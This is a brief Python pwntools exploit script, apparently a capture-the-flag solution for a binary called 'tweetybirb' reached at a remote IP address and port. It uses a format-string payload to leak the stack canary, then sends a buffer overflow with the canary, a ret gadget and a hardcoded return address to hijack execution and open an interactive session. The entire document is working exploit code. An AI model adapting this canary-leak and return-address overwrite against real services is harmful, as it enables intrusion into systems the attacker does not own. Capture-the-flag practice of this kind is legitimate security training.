from pwn import *
#p=process('./tweetybirb')
p=remote('143.198.184.186',5002)
#raw_input("DEBUG")

payload = "%15$p"
p.sendlineafter("magpies?\n",payload)
canary = int(p.recvuntil("\n"),16)
print hex(canary)
payload = "a"*72
payload += p64(canary)
payload += "a"*8
payload += p64(0x000000000040101a)
payload += p64(0x4011d6)
p.sendlineafter("fowl?\n",payload)

p.interactive()